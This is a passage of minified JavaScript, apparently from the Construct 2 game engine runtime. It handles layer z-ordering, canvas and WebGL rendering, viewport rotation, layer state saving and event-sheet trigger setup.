            t.zindex = this.instances.length, this.instances.push(t), e && this.useRenderCells && t.rendercells && t.set_bbox_changed(), this.render_list_stale = !0
        }, s.prototype.prependToInstanceList = function (t, e) {
            this.instances.unshift(t), this.setZIndicesStaleFrom(0), e && this.useRenderCells && t.rendercells && t.set_bbox_changed()
        }, s.prototype.moveInstanceAdjacent = function (t, e, i) {
            var n = t.get_zindex(),
                r = e.get_zindex();
            cr.arrayRemove(this.instances, n), n < r && r--, i && r++, r === this.instances.length ? this.instances.push(t) : this.instances.splice(r, 0, t), this.setZIndicesStaleFrom(n < r ? n : r)
        }, s.prototype.setZIndicesStaleFrom = function (t) {
            (-1 === this.zindices_stale_from || t < this.zindices_stale_from) && (this.zindices_stale_from = t), this.zindices_stale = !0, this.render_list_stale = !0
        }, s.prototype.updateZIndices = function () {
            if (this.zindices_stale) {
                var t, e, i;
                if (-1 === this.zindices_stale_from && (this.zindices_stale_from = 0), this.useRenderCells)
                    for (t = this.zindices_stale_from, e = this.instances.length; t < e; ++t)(i = this.instances[t]).zindex = t, this.render_grid.markRangeChanged(i.rendercells);
                else
                    for (t = this.zindices_stale_from, e = this.instances.length; t < e; ++t) this.instances[t].zindex = t;
                this.zindices_stale = !1, this.zindices_stale_from = -1
            }
        }, s.prototype.getScale = function (t) {
            return this.getNormalScale() * (this.runtime.fullscreenScalingQuality || t ? this.runtime.aspect_scale : 1)
        }, s.prototype.getNormalScale = function () {
            return (this.scale * this.layout.scale - 1) * this.zoomRate + 1
        }, s.prototype.getAngle = function () {
            return this.disableAngle ? 0 : cr.clamp_angle(this.layout.angle + this.angle)
        };
        var o = [];

        function a() {
            return o.length ? o.pop() : []
        }

        function h(t) {
            cr.clearArray(t), o.push(t)
        }

        function c(t, e, i) {
            var n, r, s = 0,
                o = 0,
                a = 0,
                h = t.length,
                c = e.length;
            for (i.length = h + c; s < h && o < c; ++a) n = t[s], r = e[o], n.zindex < r.zindex ? (i[a] = n, ++s) : (i[a] = r, ++o);
            for (; s < h; ++s, ++a) i[a] = t[s];
            for (; o < c; ++o, ++a) i[a] = e[o]
        }
        var l = [];

        function u(t, e) {
            var i, n, r, s, o;
            for (i = 0, n = t.length; i < n - 1; i += 2) c(r = t[i], s = t[i + 1], o = a()), e || (h(r), h(s)), l.push(o);
            n % 2 == 1 && (e ? (r = a(), cr.shallowAssignArray(r, t[n - 1]), l.push(r)) : l.push(t[n - 1])), cr.shallowAssignArray(t, l), cr.clearArray(l)
        }
        var p = [];
        s.prototype.getRenderCellInstancesToDraw = function () {
            if (this.updateZIndices(), this.render_grid.queryRange(this.viewLeft, this.viewTop, this.viewRight, this.viewBottom, p), !p.length) return a();
            if (1 === p.length) {
                var t = a();
                return cr.shallowAssignArray(t, p[0]), cr.clearArray(p), t
            }
            var e = function (t) {
                for (var e = !0; t.length > 1;) u(t, e), e = !1;
                return t[0]
            }(p);
            return cr.clearArray(p), e
        }, s.prototype.draw = function (t) {
            this.render_offscreen = this.forceOwnTexture || 1 !== this.opacity || 0 !== this.blend_mode;
            var e = this.runtime.canvas,
                i = t,
                n = !1;
            this.render_offscreen && (this.runtime.layer_canvas || (this.runtime.layer_canvas = document.createElement("canvas"), (e = this.runtime.layer_canvas).width = this.runtime.draw_width, e.height = this.runtime.draw_height, this.runtime.layer_ctx = e.getContext("2d"), n = !0), e = this.runtime.layer_canvas, i = this.runtime.layer_ctx, e.width !== this.runtime.draw_width && (e.width = this.runtime.draw_width, n = !0), e.height !== this.runtime.draw_height && (e.height = this.runtime.draw_height, n = !0), n && this.runtime.setCtxImageSmoothingEnabled(i, this.runtime.linearSampling), this.transparent && i.clearRect(0, 0, this.runtime.draw_width, this.runtime.draw_height)), i.globalAlpha = 1, i.globalCompositeOperation = "source-over", this.transparent || (i.fillStyle = "rgb(" + this.background_color[0] + "," + this.background_color[1] + "," + this.background_color[2] + ")", i.fillRect(0, 0, this.runtime.draw_width, this.runtime.draw_height)), i.save(), this.disableAngle = !0;
            var r = this.canvasToLayer(0, 0, !0, !0),
                s = this.canvasToLayer(0, 0, !1, !0);
            this.disableAngle = !1, this.runtime.pixel_rounding && (r = Math.round(r), s = Math.round(s)), this.rotateViewport(r, s, i);
            var o, a = this.getScale();
            i.scale(a, a), i.translate(-r, -s), this.useRenderCells ? (this.cur_render_cells.left = this.render_grid.XToCell(this.viewLeft), this.cur_render_cells.top = this.render_grid.YToCell(this.viewTop), this.cur_render_cells.right = this.render_grid.XToCell(this.viewRight), this.cur_render_cells.bottom = this.render_grid.YToCell(this.viewBottom), this.render_list_stale || !this.cur_render_cells.equals(this.last_render_cells) ? (h(this.last_render_list), o = this.getRenderCellInstancesToDraw(), this.render_list_stale = !1, this.last_render_cells.copy(this.cur_render_cells)) : o = this.last_render_list) : o = this.instances;
            var c, l, u, p = null;
            for (c = 0, l = o.length; c < l; ++c)(u = o[c]) !== p && (this.drawInstance(u, i), p = u);
            this.useRenderCells && (this.last_render_list = o), i.restore(), this.render_offscreen && (t.globalCompositeOperation = this.compositeOp, t.globalAlpha = this.opacity, t.drawImage(e, 0, 0))
        }, s.prototype.drawInstance = function (t, e) {
            if (t.visible && 0 !== t.width && 0 !== t.height) {
                t.update_bbox();
                var i = t.bbox;
                i.right < this.viewLeft || i.bottom < this.viewTop || i.left > this.viewRight || i.top > this.viewBottom || (e.globalCompositeOperation = t.compositeOp, t.draw(e))
            }
        }, s.prototype.updateViewport = function (t) {
            this.disableAngle = !0;
            var e = this.canvasToLayer(0, 0, !0, !0),
                i = this.canvasToLayer(0, 0, !1, !0);
            this.disableAngle = !1, this.runtime.pixel_rounding && (e = Math.round(e), i = Math.round(i)), this.rotateViewport(e, i, t)
        }, s.prototype.rotateViewport = function (t, e, i) {
            var n, r = this.getScale();
            this.viewLeft = t, this.viewTop = e, this.viewRight = t + this.runtime.draw_width * (1 / r), this.viewBottom = e + this.runtime.draw_height * (1 / r), this.viewLeft > this.viewRight && (n = this.viewLeft, this.viewLeft = this.viewRight, this.viewRight = n), this.viewTop > this.viewBottom && (n = this.viewTop, this.viewTop = this.viewBottom, this.viewBottom = n);
            var s = this.getAngle();
            0 !== s && (i && (i.translate(this.runtime.draw_width / 2, this.runtime.draw_height / 2), i.rotate(-s), i.translate(this.runtime.draw_width / -2, this.runtime.draw_height / -2)), this.tmprect.set(this.viewLeft, this.viewTop, this.viewRight, this.viewBottom), this.tmprect.offset((this.viewLeft + this.viewRight) / -2, (this.viewTop + this.viewBottom) / -2), this.tmpquad.set_from_rotated_rect(this.tmprect, s), this.tmpquad.bounding_box(this.tmprect), this.tmprect.offset((this.viewLeft + this.viewRight) / 2, (this.viewTop + this.viewBottom) / 2), this.viewLeft = this.tmprect.left, this.viewTop = this.tmprect.top, this.viewRight = this.tmprect.right, this.viewBottom = this.tmprect.bottom)
        }, s.prototype.drawGL_earlyZPass = function (t) {
            this.runtime.draw_width, this.runtime.draw_height;
            this.render_offscreen = this.forceOwnTexture, this.render_offscreen && (this.runtime.layer_tex || (this.runtime.layer_tex = t.createEmptyTexture(this.runtime.draw_width, this.runtime.draw_height, this.runtime.linearSampling)), this.runtime.layer_tex.c2width === this.runtime.draw_width && this.runtime.layer_tex.c2height === this.runtime.draw_height || (t.deleteTexture(this.runtime.layer_tex), this.runtime.layer_tex = t.createEmptyTexture(this.runtime.draw_width, this.runtime.draw_height, this.runtime.linearSampling)), t.setRenderingToTexture(this.runtime.layer_tex)), this.disableAngle = !0;
            var e = this.canvasToLayer(0, 0, !0, !0),
                i = this.canvasToLayer(0, 0, !1, !0);
            this.disableAngle = !1, this.runtime.pixel_rounding && (e = Math.round(e), i = Math.round(i)), this.rotateViewport(e, i, null);
            var n, r = this.getScale();
            t.resetModelView(), t.scale(r, r), t.rotateZ(-this.getAngle()), t.translate((this.viewLeft + this.viewRight) / -2, (this.viewTop + this.viewBottom) / -2), t.updateModelView(), this.useRenderCells ? (this.cur_render_cells.left = this.render_grid.XToCell(this.viewLeft), this.cur_render_cells.top = this.render_grid.YToCell(this.viewTop), this.cur_render_cells.right = this.render_grid.XToCell(this.viewRight), this.cur_render_cells.bottom = this.render_grid.YToCell(this.viewBottom), this.render_list_stale || !this.cur_render_cells.equals(this.last_render_cells) ? (h(this.last_render_list), n = this.getRenderCellInstancesToDraw(), this.render_list_stale = !1, this.last_render_cells.copy(this.cur_render_cells)) : n = this.last_render_list) : n = this.instances;
            var s, o, a = null;
            for (s = n.length - 1; s >= 0; --s)(o = n[s]) !== a && (this.drawInstanceGL_earlyZPass(n[s], t), a = o);
            this.useRenderCells && (this.last_render_list = n), this.transparent || (this.clear_earlyz_index = this.runtime.earlyz_index++, t.setEarlyZIndex(this.clear_earlyz_index), t.setColorFillMode(1, 1, 1, 1), t.fullscreenQuad(), t.restoreEarlyZMode())
        }, s.prototype.drawGL = function (t) {
            this.runtime.draw_width, this.runtime.draw_height;
            var e = 0,
                i = 0;
            this.render_offscreen = this.forceOwnTexture || 1 !== this.opacity || this.active_effect_types.length > 0 || 0 !== this.blend_mode, this.render_offscreen && (this.runtime.layer_tex || (this.runtime.layer_tex = t.createEmptyTexture(this.runtime.draw_width, this.runtime.draw_height, this.runtime.linearSampling)), this.runtime.layer_tex.c2width === this.runtime.draw_width && this.runtime.layer_tex.c2height === this.runtime.draw_height || (t.deleteTexture(this.runtime.layer_tex), this.runtime.layer_tex = t.createEmptyTexture(this.runtime.draw_width, this.runtime.draw_height, this.runtime.linearSampling)), t.setRenderingToTexture(this.runtime.layer_tex), this.transparent && t.clear(0, 0, 0, 0)), this.transparent || (this.runtime.enableFrontToBack ? (t.setEarlyZIndex(this.clear_earlyz_index), t.setColorFillMode(this.background_color[0] / 255, this.background_color[1] / 255, this.background_color[2] / 255, 1), t.fullscreenQuad(), t.setTextureFillMode()) : t.clear(this.background_color[0] / 255, this.background_color[1] / 255, this.background_color[2] / 255, 1)), this.disableAngle = !0;
            var n = this.canvasToLayer(0, 0, !0, !0),
                r = this.canvasToLayer(0, 0, !1, !0);
            this.disableAngle = !1, this.runtime.pixel_rounding && (n = Math.round(n), r = Math.round(r)), this.rotateViewport(n, r, null);
            var s, o = this.getScale();
            t.resetModelView(), t.scale(o, o), t.rotateZ(-this.getAngle()), t.translate((this.viewLeft + this.viewRight) / -2, (this.viewTop + this.viewBottom) / -2), t.updateModelView(), this.useRenderCells ? (this.cur_render_cells.left = this.render_grid.XToCell(this.viewLeft), this.cur_render_cells.top = this.render_grid.YToCell(this.viewTop), this.cur_render_cells.right = this.render_grid.XToCell(this.viewRight), this.cur_render_cells.bottom = this.render_grid.YToCell(this.viewBottom), this.render_list_stale || !this.cur_render_cells.equals(this.last_render_cells) ? (h(this.last_render_list), s = this.getRenderCellInstancesToDraw(), this.render_list_stale = !1, this.last_render_cells.copy(this.cur_render_cells)) : s = this.last_render_list) : s = this.instances;
            var a, c, l, u = null;
            for (a = 0, c = s.length; a < c; ++a)(l = s[a]) !== u && (this.drawInstanceGL(s[a], t), u = l);
            if (this.useRenderCells && (this.last_render_list = s), this.render_offscreen)
                if (e = this.active_effect_types.length ? this.active_effect_types[0].shaderindex : 0, i = this.active_effect_types.length ? this.active_effect_types[0].index : 0, 0 === this.active_effect_types.length || 1 === this.active_effect_types.length && !t.programUsesCrossSampling(e) && 1 === this.opacity) {
                    1 === this.active_effect_types.length ? (t.switchProgram(e), t.setProgramParameters(this.layout.getRenderTarget(), 1 / this.runtime.draw_width, 1 / this.runtime.draw_height, 0, 0, 1, 1, o, this.getAngle(), this.viewLeft, this.viewTop, (this.viewLeft + this.viewRight) / 2, (this.viewTop + this.viewBottom) / 2, this.runtime.kahanTime.sum, this.effect_params[i]), t.programIsAnimated(e) && (this.runtime.redraw = !0)) : t.switchProgram(0), t.setRenderingToTexture(this.layout.getRenderTarget()), t.setOpacity(this.opacity), t.setTexture(this.runtime.layer_tex), t.setBlend(this.srcBlend, this.destBlend), t.resetModelView(), t.updateModelView();
                    var p = this.runtime.draw_width / 2,
                        d = this.runtime.draw_height / 2;
                    t.quad(-p, d, p, d, p, -d, -p, -d), t.setTexture(null)
                } else this.layout.renderEffectChain(t, this, null, this.layout.getRenderTarget())
        }, s.prototype.drawInstanceGL = function (t, e) {
            if (t.visible && 0 !== t.width && 0 !== t.height) {
                t.update_bbox();
                var i = t.bbox;
                i.right < this.viewLeft || i.bottom < this.viewTop || i.left > this.viewRight || i.top > this.viewBottom || (e.setEarlyZIndex(t.earlyz_index), t.uses_shaders ? this.drawInstanceWithShadersGL(t, e) : (e.switchProgram(0), e.setBlend(t.srcBlend, t.destBlend), t.drawGL(e)))
            }
        }, s.prototype.drawInstanceGL_earlyZPass = function (t, e) {
            if (t.visible && 0 !== t.width && 0 !== t.height) {
                t.update_bbox();
                var i = t.bbox;
                i.right < this.viewLeft || i.bottom < this.viewTop || i.left > this.viewRight || i.top > this.viewBottom || (t.earlyz_index = this.runtime.earlyz_index++, 0 === t.blend_mode && 1 === t.opacity && t.shaders_preserve_opaqueness && t.drawGL_earlyZPass && (e.setEarlyZIndex(t.earlyz_index), t.drawGL_earlyZPass(e)))
            }
        }, s.prototype.drawInstanceWithShadersGL = function (t, e) {
            var i = t.active_effect_types[0].shaderindex,
                n = t.active_effect_types[0].index,
                r = this.getScale();
            if (1 !== t.active_effect_types.length || e.programUsesCrossSampling(i) || e.programExtendsBox(i) || (t.angle || t.layer.getAngle()) && e.programUsesDest(i) || 1 !== t.opacity || t.type.plugin.must_predraw) this.layout.renderEffectChain(e, this, t, this.render_offscreen ? this.runtime.layer_tex : this.layout.getRenderTarget()), e.resetModelView(), e.scale(r, r), e.rotateZ(-this.getAngle()), e.translate((this.viewLeft + this.viewRight) / -2, (this.viewTop + this.viewBottom) / -2), e.updateModelView();
            else {
                e.switchProgram(i), e.setBlend(t.srcBlend, t.destBlend), e.programIsAnimated(i) && (this.runtime.redraw = !0);
                var s, o, a = 0,
                    h = 0,
                    c = 0,
                    l = 0;
                if (e.programUsesDest(i)) {
                    var u = t.bbox,
                        p = this.layerToCanvas(u.left, u.top, !0, !0),
                        d = this.layerToCanvas(u.left, u.top, !1, !0),
                        f = this.layerToCanvas(u.right, u.bottom, !0, !0),
                        m = this.layerToCanvas(u.right, u.bottom, !1, !0);
                    a = p / windowWidth, h = 1 - d / windowHeight, c = f / windowWidth, l = 1 - m / windowHeight
                }
                if (t.curFrame && t.curFrame.texture_img) {
                    var g = t.curFrame.texture_img;
                    s = 1 / g.width, o = 1 / g.height
                } else s = 1 / t.width, o = 1 / t.height;
                e.setProgramParameters(this.render_offscreen ? this.runtime.layer_tex : this.layout.getRenderTarget(), s, o, a, h, c, l, r, this.getAngle(), this.viewLeft, this.viewTop, (this.viewLeft + this.viewRight) / 2, (this.viewTop + this.viewBottom) / 2, this.runtime.kahanTime.sum, t.effect_params[n]), t.drawGL(e)
            }
        }, s.prototype.canvasToLayer = function (t, e, i, n) {
            var r = this.runtime.devicePixelRatio;
            this.runtime.isRetina && (t *= r, e *= r);
            var s = this.runtime.parallax_x_origin,
                o = this.runtime.parallax_y_origin,
                a = (this.layout.scrollX - s) * this.parallaxX + s,
                h = (this.layout.scrollY - o) * this.parallaxY + o,
                c = a,
                l = h,
                u = 1 / this.getScale(!n);
            n ? (c -= this.runtime.draw_width * u / 2, l -= this.runtime.draw_height * u / 2) : (c -= this.runtime.width * u / 2, l -= this.runtime.height * u / 2), c += t * u, l += e * u;
            var p = this.getAngle();
            if (0 !== p) {
                c -= a, l -= h;
                var d = Math.cos(p),
                    f = Math.sin(p),
                    m = c * d - l * f;
                l = l * d + c * f, c = m, c += a, l += h
            }
            return i ? c : l
        }, s.prototype.layerToCanvas = function (t, e, i, n) {
            var r = this.runtime.parallax_x_origin,
                s = this.runtime.parallax_y_origin,
                o = (this.layout.scrollX - r) * this.parallaxX + r,
                a = (this.layout.scrollY - s) * this.parallaxY + s,
                h = o,
                c = a,
                l = this.getAngle();
            if (0 !== l) {
                t -= o, e -= a;
                var u = Math.cos(-l),
                    p = Math.sin(-l),
                    d = t * u - e * p;
                e = e * u + t * p, t = d, t += o, e += a
            }
            var f = 1 / this.getScale(!n);
            n ? (h -= this.runtime.draw_width * f / 2, c -= this.runtime.draw_height * f / 2) : (h -= this.runtime.width * f / 2, c -= this.runtime.height * f / 2), h = (t - h) / f, c = (e - c) / f;
            var m = this.runtime.devicePixelRatio;
            return this.runtime.isRetina && !n && (h /= m, c /= m), i ? h : c
        }, s.prototype.rotatePt = function (t, e, i) {
            if (0 === this.getAngle()) return i ? t : e;
            var n = this.layerToCanvas(t, e, !0),
                r = this.layerToCanvas(t, e, !1);
            this.disableAngle = !0;
            var s = this.canvasToLayer(n, r, !0),
                o = this.canvasToLayer(n, r, !0);
            return this.disableAngle = !1, i ? s : o
        }, s.prototype.saveToJSON = function () {
            var t, e, i, n = {
                s: this.scale,
                a: this.angle,
                vl: this.viewLeft,
                vt: this.viewTop,
                vr: this.viewRight,
                vb: this.viewBottom,
                v: this.visible,
                bc: this.background_color,
                t: this.transparent,
                px: this.parallaxX,
                py: this.parallaxY,
                o: this.opacity,
                zr: this.zoomRate,
                fx: [],
                cg: this.created_globals,
                instances: []
            };
            for (t = 0, e = this.effect_types.length; t < e; t++) i = this.effect_types[t], n.fx.push({
                name: i.name,
                active: i.active,
                params: this.effect_params[i.index]
            });
            return n
        }, s.prototype.loadFromJSON = function (t) {
            var e, n, r, s;
            this.scale = t.s, this.angle = t.a, this.viewLeft = t.vl, this.viewTop = t.vt, this.viewRight = t.vr, this.viewBottom = t.vb, this.visible = t.v, this.background_color = t.bc, this.transparent = t.t, this.parallaxX = t.px, this.parallaxY = t.py, this.opacity = t.o, this.zoomRate = t.zr, this.created_globals = t.cg || [], cr.shallowAssignArray(this.initial_instances, this.startup_initial_instances);
            var o = new cr.ObjectSet;
            for (e = 0, r = this.created_globals.length; e < r; ++e) o.add(this.created_globals[e]);
            for (e = 0, n = 0, r = this.initial_instances.length; e < r; ++e) o.contains(this.initial_instances[e][2]) || (this.initial_instances[n] = this.initial_instances[e], ++n);
            cr.truncateArray(this.initial_instances, n);
            var a = t.fx;
            for (e = 0, r = a.length; e < r; e++)(s = this.getEffectByName(a[e].name)) && (s.active = a[e].active, this.effect_params[s.index] = a[e].params);
            this.updateActiveEffects(), this.instances.sort(i), this.zindices_stale = !0
        }, cr.layer = s
    }(),
    function () {
        var t = [];

        function e(t, e) {
            var i, n = t.length;
            switch (n) {
                case 0:
                    return !0;
                case 1:
                    return t[0] === e[0];
                case 2:
                    return t[0] === e[0] && t[1] === e[1];
                default:
                    for (i = 0; i < n; i++)
                        if (t[i] !== e[i]) return !1;
                    return !0
            }
        }

        function i(t, e) {
            return t.index - e.index
        }

        function n(n) {
            var r, s, o, a, h;
            for (2 === n.length ? n[0].index > n[1].index && (a = n[0], n[0] = n[1], n[1] = a) : n.length > 2 && n.sort(i), n.length >= t.length && (t.length = n.length + 1), t[n.length] || (t[n.length] = []), r = 0, s = (h = t[n.length]).length; r < s; r++)
                if (e(n, o = h[r])) return o;
            return h.push(n), n
        }

        function r(t, e) {
            this.runtime = t, this.triggers = {}, this.fasttriggers = {}, this.hasRun = !1, this.includes = new cr.ObjectSet, this.deep_includes = [], this.already_included_sheets = [], this.name = e[0];
            var i, n, r = e[1];
            for (this.events = [], i = 0, n = r.length; i < n; i++) this.init_event(r[i], null, this.events)
        }

        function s(t) {
            this.type = t, this.instances = [], this.else_instances = [], this.select_all = !0
        }

        function o(t, e, i) {
            var n, r;
            this.sheet = t, this.parent = e, this.runtime = t.runtime, this.solModifiers = [], this.solModifiersIncludingParents = [], this.solWriterAfterCnds = !1, this.group = !1, this.initially_activated = !1, this.toplevelevent = !1, this.toplevelgroup = !1, this.has_else_block = !1, this.conditions = [], this.actions = [], this.subevents = [], this.group_name = "", this.group = !1, this.initially_activated = !1, this.group_active = !1, this.contained_includes = null, i[1] && (this.group_name = i[1][1].toLowerCase(), this.group = !0, this.initially_activated = !!i[1][0], this.contained_includes = [], this.group_active = this.initially_activated, this.runtime.allGroups.push(this), this.runtime.groups_by_name[this.group_name] = this), this.orblock = i[2], this.sid = i[4], this.group || (this.runtime.blocksBySid[this.sid.toString()] = this);
            var s = i[5];
            for (n = 0, r = s.length; n < r; n++) {
                var o = new cr.condition(this, s[n]);
                o.index = n, cr.seal(o), this.conditions.push(o), this.addSolModifier(o.type)
            }
            var a = i[6];
            for (n = 0, r = a.length; n < r; n++) {
                var h = new cr.action(this, a[n]);
                h.index = n, cr.seal(h), this.actions.push(h)
            }
            if (8 === i.length) {
                var c = i[7];
                for (n = 0, r = c.length; n < r; n++) this.sheet.init_event(c[n], this, this.subevents)
            }
            this.is_else_block = !1, this.conditions.length && (this.is_else_block = null == this.conditions[0].type && this.conditions[0].func == cr.system_object.prototype.cnds.Else)
        }

        function a(t, e) {
            var i, n, r;
            if (t && (-1 === e.indexOf(t) && e.push(t), t.is_contained))
                for (i = 0, n = t.container.length; i < n; i++) t !== (r = t.container[i]) && -1 === e.indexOf(r) && e.push(r)
        }

        function h(t, e) {
            if (this.block = t, this.sheet = t.sheet, this.runtime = t.runtime, this.parameters = [], this.results = [], this.extra = {}, this.index = -1, this.anyParamVariesPerInstance = !1, this.func = this.runtime.GetObjectReference(e[1]), this.trigger = e[3] > 0, this.fasttrigger = 2 === e[3], this.looping = e[4], this.inverted = e[5], this.isstatic = e[6], this.sid = e[7], this.runtime.cndsBySid[this.sid.toString()] = this, -1 === e[0] ? (this.type = null, this.run = this.run_system, this.behaviortype = null, this.beh_index = -1) : (this.type = this.runtime.types_by_index[e[0]], this.isstatic ? this.run = this.run_static : this.run = this.run_object, e[2] ? (this.behaviortype = this.type.getBehaviorByName(e[2]), this.beh_index = this.type.getBehaviorIndexByName(e[2])) : (this.behaviortype = null, this.beh_index = -1), this.block.parent && this.block.parent.setSolWriterAfterCnds()), this.fasttrigger && (this.run = this.run_true), 10 === e.length) {
                var i, n, r = e[9];
                for (i = 0, n = r.length; i < n; i++) {
                    var s = new cr.parameter(this, r[i]);
                    cr.seal(s), this.parameters.push(s)
                }
                this.results.length = r.length
            }
        }

        function c(t, e) {
            if (this.block = t, this.sheet = t.sheet, this.runtime = t.runtime, this.parameters = [], this.results = [], this.extra = {}, this.index = -1, this.anyParamVariesPerInstance = !1, this.func = this.runtime.GetObjectReference(e[1]), -1 === e[0] ? (this.type = null, this.run = this.run_system, this.behaviortype = null, this.beh_index = -1) : (this.type = this.runtime.types_by_index[e[0]], this.run = this.run_object, e[2] ? (this.behaviortype = this.type.getBehaviorByName(e[2]), this.beh_index = this.type.getBehaviorIndexByName(e[2])) : (this.behaviortype = null, this.beh_index = -1)), this.sid = e[3], this.runtime.actsBySid[this.sid.toString()] = this, 6 === e.length) {
                var i, n, r = e[5];
                for (i = 0, n = r.length; i < n; i++) {
                    var s = new cr.parameter(this, r[i]);
                    cr.seal(s), this.parameters.push(s)
                }
                this.results.length = r.length
            }
        }
        r.prototype.toString = function () {
            return this.name
        }, r.prototype.init_event = function (t, e, i) {
            switch (t[0]) {
                case 0:
                    var n, r, s = new cr.eventblock(this, e, t);
                    if (cr.seal(s), s.orblock)
                        for (i.push(s), n = 0, r = s.conditions.length; n < r; n++) s.conditions[n].trigger && this.init_trigger(s, n);
                    else s.is_trigger() ? this.init_trigger(s, 0) : i.push(s);
                    break;
                case 1:
                    var o = new cr.eventvariable(this, e, t);
                    cr.seal(o), i.push(o);
                    break;
                case 2:
                    var a = new cr.eventinclude(this, e, t);
                    cr.seal(a), i.push(a);
                    break;
                default:
            }
        }, r.prototype.postInit = function () {
            var t, e;
            for (t = 0, e = this.events.length; t < e; t++) this.events[t].postInit(t < e - 1 && this.events[t + 1].is_else_block)
        }, r.prototype.updateDeepIncludes = function () {
            cr.clearArray(this.deep_includes), cr.clearArray(this.already_included_sheets), this.addDeepIncludes(this), cr.clearArray(this.already_included_sheets)
        }, r.prototype.addDeepIncludes = function (t) {
            var e, i, n, r, s = t.deep_includes,
                o = t.already_included_sheets,
                a = this.includes.valuesRef();
            for (e = 0, i = a.length; e < i; ++e) r = (n = a[e]).include_sheet, !n.isActive() || t === r || o.indexOf(r) > -1 || (o.push(r), r.addDeepIncludes(t), s.push(r))
        }, r.prototype.run = function (t) {
            var e, i;
            for (this.runtime.resuming_breakpoint || (this.hasRun = !0, t || (this.runtime.isRunningEvents = !0)), e = 0, i = this.events.length; e < i; e++) {
                var n = this.events[e];
                n.run(), this.runtime.clearSol(n.solModifiers), this.runtime.hasPendingInstances && this.runtime.ClearDeathRow()
            }
            t || (this.runtime.isRunningEvents = !1)
        }, r.prototype.init_trigger = function (t, e) {
            t.orblock || this.runtime.triggers_to_postinit.push(t);
            var i, n = t.conditions[e];
            i = n.type ? n.type.name : "system";
            var r = n.fasttrigger,
                s = r ? this.fasttriggers : this.triggers;
            s[i] || (s[i] = []);
            var o = s[i],
                a = n.func;
            if (r) {
                if (!n.parameters.length) return;
                var h, c = n.parameters[0];
                if (1 !== c.type || 2 !== c.expression.type) return;
                var l, u, p = c.expression.value.toLowerCase();
                for (l = 0, u = o.length; l < u; l++)
                    if (o[l].method == a) return void((h = o[l].evs)[p] ? h[p].push([t, e]) : h[p] = [
                        [t, e]
                    ]);
                (h = {})[p] = [
                    [t, e]
                ], o.push({
                    method: a,
                    evs: h
                })
            } else {
                for (l = 0, u = o.length; l < u; l++)
                    if (o[l].method == a) return void o[l].evs.push([t, e]);
                ! function (t) {
                    return !(!cr.plugins_.Sprite || t !== cr.plugins_.Sprite.prototype.cnds.OnFrameChanged)
                }(a) ? o.push({
                    method: a,
                    evs: [
                        [t, e]
                    ]
                }): o.unshift({
                    method: a,
                    evs: [
                        [t, e]
                    ]
                })
            }
        }, cr.eventsheet = r, s.prototype.hasObjects = function () {
            return this.select_all ? this.type.instances.length : this.instances.length
        }, s.prototype.getObjects = function () {
            return this.select_all ? this.type.instances : this.instances
        }, s.prototype.pick_one = function (t) {
            if (t)
                if (t.runtime.getCurrentEventStack().current_event.orblock) {
                    this.select_all && (cr.clearArray(this.instances), cr.shallowAssignArray(this.else_instances, t.type.instances), this.select_all = !1);
                    var e = this.else_instances.indexOf(t); - 1 !== e && (this.instances.push(this.else_instances[e]), this.else_instances.splice(e, 1))
                } else this.select_all = !1, cr.clearArray(this.instances), this.instances[0] = t
        }, cr.selection = s, window._c2hh_ = "36E82313AF922787663EA3963A5212A4CCBA2106", o.prototype.postInit = function (t) {
            var e, i, r = this.parent;
            if (this.group)
                for (this.toplevelgroup = !0; r;) {
                    if (!r.group) {
                        this.toplevelgroup = !1;
                        break
                    }
                    r = r.parent
                }
            for (this.toplevelevent = !this.is_trigger() && (!this.parent || this.parent.group && this.parent.toplevelgroup), this.has_else_block = !!t, this.solModifiersIncludingParents = this.solModifiers.slice(0), r = this.parent; r;) {
                for (e = 0, i = r.solModifiers.length; e < i; e++) this.addParentSolModifier(r.solModifiers[e]);
                r = r.parent
            }
            for (this.solModifiers = n(this.solModifiers), this.solModifiersIncludingParents = n(this.solModifiersIncludingParents), e = 0, i = this.conditions.length; e < i; e++) this.conditions[e].postInit();
            for (e = 0, i = this.actions.length; e < i; e++) this.actions[e].postInit();
            for (e = 0, i = this.subevents.length; e < i; e++) this.subevents[e].postInit(e < i - 1 && this.subevents[e + 1].is_else_block)
        }, o.prototype.setGroupActive = function (t) {
            if (this.group_active !== !!t) {
                var e, i;
                for (this.group_active = !!t, e = 0, i = this.contained_includes.length; e < i; ++e) this.contained_includes[e].updateActive();
                i > 0 && this.runtime.running_layout.event_sheet && this.runtime.running_layout.event_sheet.updateDeepIncludes()
            }
        }, o.prototype.addSolModifier = function (t) {
            a(t, this.solModifiers)
        }, o.prototype.addParentSolModifier = function (t) {
            a(t, this.solModifiersIncludingParents)
        }, o.prototype.setSolWriterAfterCnds = function () {
            this.solWriterAfterCnds = !0, this.parent && this.parent.setSolWriterAfterCnds()
        }, o.prototype.is_trigger = function () {
            return !!this.conditions.length && this.conditions[0].trigger
        }, o.prototype.run = function () {
            var t, e, i = !1,
                n = this.runtime,
                r = this.runtime.getCurrentEventStack();
            r.current_event = this;
            var s = this.conditions;
            if (this.is_else_block || (r.else_branch_ran = !1), this.orblock) {
                for (0 === s.length && (i = !0), r.cndindex = 0, t = s.length; r.cndindex < t; r.cndindex++)(e = s[r.cndindex]).trigger || e.run() && (i = !0);
                r.last_event_true = i, i && this.run_actions_and_subevents()
            } else {
                for (r.cndindex = 0, t = s.length; r.cndindex < t; r.cndindex++)
                    if (!s[r.cndindex].run()) return r.last_event_true = !1, void(this.toplevelevent && n.hasPendingInstances && n.ClearDeathRow());
                r.last_event_true = !0, this.run_actions_and_subevents()
            }
            this.end_run(r)
        }, o.prototype.end_run = function (t) {
            t.last_event_true && this.has_else_block && (t.else_branch_ran = !0), this.toplevelevent && this.runtime.hasPendingInstances && this.runtime.ClearDeathRow()
        }, o.prototype.run_orblocktrigger = function (t) {
            this.runtime.getCurrentEventStack().current_event = this, this.conditions[t].run() && (this.run_actions_and_subevents(), this.runtime.getCurrentEventStack().last_event_true = !0)
        }, o.prototype.run_actions_and_subevents = function () {
            var t, e = this.runtime.getCurrentEventStack();
            for (e.actindex = 0, t = this.actions.length; e.actindex < t; e.actindex++)
                if (this.actions[e.actindex].run()) return;
            this.run_subevents()
        }, o.prototype.resume_actions_and_subevents = function () {
            var t, e = this.runtime.getCurrentEventStack();
            for (t = this.actions.length; e.actindex < t; e.actindex++)
                if (this.actions[e.actindex].run()) return;
            this.run_subevents()
        }, o.prototype.run_subevents = function () {
            if (this.subevents.length) {
                var t, e, i, n, r = this.subevents.length - 1;
                if (this.runtime.pushEventStack(this), this.solWriterAfterCnds)
